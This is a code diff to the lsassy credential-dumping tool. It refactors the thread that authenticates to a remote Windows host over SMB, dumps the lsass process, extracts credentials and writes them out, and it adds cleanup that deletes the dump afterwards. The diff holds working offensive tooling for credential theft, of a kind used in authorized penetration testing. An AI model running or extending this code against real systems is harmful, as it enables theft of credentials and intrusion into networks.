@@ -27,88 +27,95 @@ class TLsassy(Thread):
         """
         Main method to dump credentials on a remote host
         """
+        try:
+            # Credential parsing
+            username = self.args.username if self.args.username else ""
+            password = self.args.password if self.args.password else ""
 
-        # Credential parsing
-        username = self.args.username if self.args.username else ""
-        password = self.args.password if self.args.password else ""
+            if password == "" and username != "" and self.args.hashes is None and self.args.no_pass is False and self.args.aesKey is None:
+                from getpass import getpass
+                password = getpass("Password:")
 
-        if password == "" and username != "" and self.args.hashes is None and self.args.no_pass is False and self.args.aesKey is None:
-            from getpass import getpass
-            password = getpass("Password:")
+            lmhash, nthash = "", ""
+            if not password and self.args.hashes:
+                if ":" in self.args.hashes:
+                    lmhash, nthash = self.args.hashes.split(":")
+                else:
+                    lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
 
-        lmhash, nthash = "", ""
-        if not password and self.args.hashes:
-            if ":" in self.args.hashes:
-                lmhash, nthash = self.args.hashes.split(":")
-            else:
-                lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
+            # Exec methods parsing
+            exec_methods = self.args.exec.split(",") if self.args.exec else None
 
-        # Exec methods parsing
-        exec_methods = self.args.exec.split(",") if self.args.exec else None
+            # Dump modules options parsing
+            options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
 
-        # Dump modules options parsing
-        options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
+            # Dump path checks
+            dump_path = self.args.dump_path
+            if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
+                if dump_path[0] != "C":
+                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+                    exit(1)
+                dump_path = dump_path[2:]
+            if dump_path and dump_path[-1] != "\\":
+                dump_path += "\\"
 
-        # Dump path checks
-        dump_path = self.args.dump_path
-        if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
-            if dump_path[0] != "C":
-                logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
-                exit(1)
-            dump_path = dump_path[2:]
-        if dump_path and dump_path[-1] != "\\":
-            dump_path += "\\"
-
-        session = Session()
-        session.get_session(
-            address=self.target,
-            target_ip=self.target,
-            port=self.args.port,
-            lmhash=lmhash,
-            nthash=nthash,
-            username=username,
-            password=password,
-            domain=self.args.domain,
-            aesKey=self.args.aesKey,
-            dc_ip=self.args.dc_ip,
-            kerberos=self.args.kerberos
-        )
-
-        if session.smb_session is None:
-            exit(1)
-
-        dumper = Dumper(session).load(self.args.dump_method)
-        if dumper is None:
-            return None
-        file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
-                           dump_name=self.args.dump_name, **options)
-
-        if file is None:
-            logging.error("Unable to dump lsass")
-            session.smb_session.close()
-            logging.debug("SMB session closed")
-            exit(1)
-
-        credentials = Parser(file).parse()
-
-        if credentials is None:
-            logging.error("Unable to extract credentials from lsass")
-            file.close()
-            logging.debug("Lsass handle closed")
-            session.smb_session.close()
-            logging.debug("SMB session closed")
-            exit(1)
-
-        with lock:
-            Writer(credentials).write(
-                self.args.format,
-                output_file=self.args.outfile,
-                quiet=self.args.quiet,
-                users_only=self.args.users
+            session = Session()
+            session.get_session(
+                address=self.target,
+                target_ip=self.target,
+                port=self.args.port,
+                lmhash=lmhash,
+                nthash=nthash,
+                username=username,
+                password=password,
+                domain=self.args.domain,
+                aesKey=self.args.aesKey,
+                dc_ip=self.args.dc_ip,
+                kerberos=self.args.kerberos
             )
 
-        session.smb_session.close()
-        logging.debug("SMB session closed")
+            if session.smb_session is None:
+                exit(1)
+
+            dumper = Dumper(session).load(self.args.dump_method)
+            if dumper is None:
+                logging.error("Unable to load dump module")
+                exit(1)
+
+            file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
+                               dump_name=self.args.dump_name, **options)
+
+            if file is None:
+                logging.error("Unable to dump lsass.")
+                exit(1)
+
+            credentials = Parser(file).parse()
+
+            if credentials is None:
+                logging.error("Unable to extract credentials from lsass. Cleaning.")
+                exit(1)
+
+            with lock:
+                Writer(credentials).write(
+                    self.args.format,
+                    output_file=self.args.outfile,
+                    quiet=self.args.quiet,
+                    users_only=self.args.users
+                )
+        except Exception as e:
+            logging.error("An unknown error has occurred.", exc_info=True)
+        finally:
+            if file is not None:
+                file.close()
+                logging.debug("Lsass handle closed")
+
+            if dumper is not None:
+                dumper.failsafe()
+                logging.debug("Lsass dump removed")
+
+            if session is not None:
+                session.smb_session.close()
+                logging.debug("SMB session closed")
 
 
 def run():
